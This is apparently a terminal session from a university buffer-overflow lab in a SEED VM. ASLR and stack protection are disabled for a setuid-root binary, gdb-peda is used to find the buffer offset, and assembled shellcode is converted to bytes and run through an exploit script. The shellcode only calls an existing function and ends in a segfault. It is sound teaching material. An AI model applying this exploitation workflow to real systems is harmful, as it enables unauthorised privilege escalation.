[06/16/22]seed@VM:~/.../bar$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
[06/16/22]seed@VM:~/.../bar$ sudo ln -sf /bin/zsh /bin/sh
[06/16/22]seed@VM:~/.../bar$ sudo su
root@VM:/home/seed/practice/a2_16/bar# gcc -m32 -o a1 -z execstack -fno-stack-protector a1.c
root@VM:/home/seed/practice/a2_16/bar# sudo chown root a1
root@VM:/home/seed/practice/a2_16/bar# sudo chmod 4755 a1
root@VM:/home/seed/practice/a2_16/bar# su seed
[06/16/22]seed@VM:~/.../bar$ 
[06/16/22]seed@VM:~/.../bar$ touch badfile
[06/16/22]seed@VM:~/.../bar$ gcc  -m32 -o a1_dbg -g -z execstack -fno-stack-protector a1.c
[06/16/22]seed@VM:~/.../bar$ gdb a1_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from a1_dbg...
gdb-peda$ b bof
Breakpoint 1 at 0x124d: file a1.c, line 13.
gdb-peda$ run
Starting program: /home/seed/practice/a2_16/bar/a1_dbg 
Inside Main
[----------------------------------registers-----------------------------------]
EAX: 0xffffcda7 --> 0x1f7 
EBX: 0x56558fc8 --> 0x3ed0 
ECX: 0xfbad24a8 
EDX: 0x0 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd5f8 --> 0x0 
ESP: 0xffffcd8c --> 0x56556382 (<main+122>:	add    esp,0x10)
EIP: 0x5655624d (<bof>:	endbr32)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556244 <frame_dummy+4>:	jmp    0x565561a0 <register_tm_clones>
   0x56556249 <__x86.get_pc_thunk.dx>:	mov    edx,DWORD PTR [esp]
   0x5655624c <__x86.get_pc_thunk.dx+3>:	ret    
=> 0x5655624d <bof>:	endbr32 
   0x56556251 <bof+4>:	push   ebp
   0x56556252 <bof+5>:	mov    ebp,esp
   0x56556254 <bof+7>:	push   ebx
   0x56556255 <bof+8>:	sub    esp,0x324
[------------------------------------stack-------------------------------------]
0000| 0xffffcd8c --> 0x56556382 (<main+122>:	add    esp,0x10)
0004| 0xffffcd90 --> 0xffffcda7 --> 0x1f7 
0008| 0xffffcd94 --> 0x1 
0012| 0xffffcd98 --> 0x844 
0016| 0xffffcd9c --> 0x5655a1a0 --> 0xfbad2498 
0020| 0xffffcda0 --> 0xf7fcb110 --> 0xf7dcd000 --> 0x464c457f 
0024| 0xffffcda4 --> 0xf7de4a3b ("ld-linux.so.2")
0028| 0xffffcda8 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (str=0xffffcda7 "\367\001") at a1.c:13
13	{
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fc8 --> 0x3ed0 
EBX: 0x56558fc8 --> 0x3ed0 
ECX: 0xfbad24a8 
EDX: 0x0 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffcd88 --> 0xffffd5f8 --> 0x0 
ESP: 0xffffca60 --> 0x3 
EIP: 0x56556265 (<bof+24>:	sub    esp,0x8)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56556255 <bof+8>:	sub    esp,0x324
   0x5655625b <bof+14>:	call   0x565563a6 <__x86.get_pc_thunk.ax>
   0x56556260 <bof+19>:	add    eax,0x2d68
=> 0x56556265 <bof+24>:	sub    esp,0x8
   0x56556268 <bof+27>:	push   DWORD PTR [ebp+0x8]
   0x5655626b <bof+30>:	lea    edx,[ebp-0x327]
   0x56556271 <bof+36>:	push   edx
   0x56556272 <bof+37>:	mov    ebx,eax
[------------------------------------stack-------------------------------------]
0000| 0xffffca60 --> 0x3 
0004| 0xffffca64 --> 0x0 
0008| 0xffffca68 --> 0xffffca70 --> 0x0 
0012| 0xffffca6c --> 0x3ffff248 
0016| 0xffffca70 --> 0x0 
0020| 0xffffca74 --> 0x0 
0024| 0xffffca78 --> 0x0 
0028| 0xffffca7c --> 0xffffca60 --> 0x3 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
16	    strcpy(buffer, str);
gdb-peda$ p $ebp
$1 = (void *) 0xffffcd88
gdb-peda$ p &buffer
$2 = (char (*)[799]) 0xffffca61
gdb-peda$ p/d 0xffffcd88 - 0xffffca61
$3 = 807
gdb-peda$ disas bar
Dump of assembler code for function bar:
   0x565562d1 <+0>:	endbr32 
   0x565562d5 <+4>:	push   ebp
   0x565562d6 <+5>:	mov    ebp,esp
   0x565562d8 <+7>:	push   ebx
   0x565562d9 <+8>:	sub    esp,0x4
   0x565562dc <+11>:	call   0x565563a6 <__x86.get_pc_thunk.ax>
   0x565562e1 <+16>:	add    eax,0x2ce7
   0x565562e6 <+21>:	sub    esp,0x8
   0x565562e9 <+24>:	push   DWORD PTR [ebp+0x8]
   0x565562ec <+27>:	lea    edx,[eax-0x1f9b]
   0x565562f2 <+33>:	push   edx
   0x565562f3 <+34>:	mov    ebx,eax
   0x565562f5 <+36>:	call   0x565560b0 <printf@plt>
   0x565562fa <+41>:	add    esp,0x10
   0x565562fd <+44>:	mov    eax,DWORD PTR [ebp+0x8]
   0x56556300 <+47>:	add    eax,0x1
   0x56556303 <+50>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556306 <+53>:	leave  
   0x56556307 <+54>:	ret    
End of assembler dump.
gdb-peda$ q
[06/16/22]seed@VM:~/.../bar$ nasm -f elf32 mysh.s -o mysh.o
[06/16/22]seed@VM:~/.../bar$ xxd -p -c 20 mysh.o
7f454c4601010100000000000000000001000300
0100000000000000000000004000000000000000
3400000000002800050002000000000000000000
0000000000000000000000000000000000000000
0000000000000000000000000000000000000000
0000000001000000010000000600000000000000
100100001a000000000000000000000010000000
0000000007000000030000000000000000000000
3001000021000000000000000000000001000000
0000000011000000020000000000000000000000
6001000040000000040000000300000004000000
1000000019000000030000000000000000000000
a00100000f000000000000000000000001000000
00000000000000000000000031c931c0b01550bb
d1625556ffd350ffd350ffd350ffd350ffd30000
00000000002e74657874002e7368737472746162
002e73796d746162002e73747274616200000000
0000000000000000000000000000000000000000
0000000000000000010000000000000000000000
0400f1ff00000000000000000000000003000100
08000000000000000000000010000100006d7973
682e73005f73746172740000
[06/16/22]seed@VM:~/.../bar$ python3 convert.py 
Length of the shellcode: 26
shellcode= (
   "\x31\xc9\x31\xc0\xb0\x15\x50\xbb\xd1\x62\x55\x56\xff\xd3\x50\xff"
   "\xd3\x50\xff\xd3\x50\xff\xd3\x50\xff\xd3"
).encode('latin-1')
[06/16/22]seed@VM:~/.../bar$ python3 exploit.py 
[06/16/22]seed@VM:~/.../bar$ ./a1
Inside Main
Input Parameter 21
Input Parameter 22
Input Parameter 23
Input Parameter 24
Input Parameter 25
Segmentation fault
[06/16/22]seed@VM:~/.../bar$ 
